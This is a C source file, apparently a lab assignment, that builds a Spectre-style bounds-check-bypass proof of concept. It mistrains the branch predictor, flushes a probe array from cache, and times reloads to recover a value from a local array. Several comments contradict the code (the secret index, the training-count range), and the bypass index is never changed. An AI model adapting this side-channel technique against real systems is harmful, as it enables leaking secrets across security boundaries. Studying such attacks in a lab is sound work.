#include "utility.h"
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>

#define BUFF_SIZE (1<<21)

#define THRESHOLD 150

#define SECRET_INDEX 67
#define MAX 20
#define MIN 10

//** Write your victim function here */
// Assume secret_array[47] is your secret value
// Assume the bounds check bypass prevents you from loading values above 20
// Use a secondary load instruction (as shown in pseudo-code) to convert secret value to address

void victim_function(uint64_t *secret_array, int index, uint64_t *known_array)
{
	uint64_t tmp;
	if (index < 20)
		tmp = known_array[secret_array[SECRET_INDEX] * 8]; // Access the secret value only if bounds check passes. (Or if mis-speculation happens)
}

int main(int argc, char **argv)
{
    int tmp;
    // Allocate a buffer using huge page
    // See the handout for details about hugepage management
    void *huge_page= mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE |
                    MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    
    if (huge_page == (void*) - 1) {
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }
    // The first access to a page triggers overhead associated with
    // page allocation, TLB insertion, etc.
    // Thus, we use a dummy write here to trigger page allocation
    // so later access will not suffer from such overhead.
    *((char *)huge_page) = 1; // dummy write to trigger page allocation


    //** STEP 1: Allocate an array into the mmap */
    uint64_t *secret_array = (uint64_t *)huge_page;
    uint64_t *known_array = (uint64_t *)huge_page + 512;

    // Initialize the array
    for (int i = 0; i < 100; i++) {
        secret_array[i] = i;
    }

    for (int i = 0; i < 1000; ++i)
	    known_array[i] = i;

    lfence();

    //** STEP 2: Mistrain the branch predictor by calling victim function here */
    // To prevent any kind of patterns, ensure each time you train it a different number of times
    int ntimes = (rand() % (MAX - MIN + 1)) + MIN; // Generate a random number between 20 and 100
    int index = 12;
    for (int i = 0; i < ntimes; ++i)
	    victim_function(secret_array, index, known_array);

    lfence();

    //** STEP 3: Clear cache using clflush from utility.h */
   
    for (int i = 0; i < 1000; ++i)
	    clflush(&known_array[i]);

    clflush(&index);
    lfence();

    //** STEP 4: Call victim function again with bounds bypass value */
    victim_function(secret_array, index, known_array); 

    //** STEP 5: Reload mmap to see load times */
    // Just read the mmap's first 100 integers
    for (int i = 0; i < 1000; i+=8)
    {
	int time = measure_one_block_access_time(&known_array[i]);
	if (time < THRESHOLD)
		printf("The secret number is %d\n", i/8);
    }
    return 0;
}
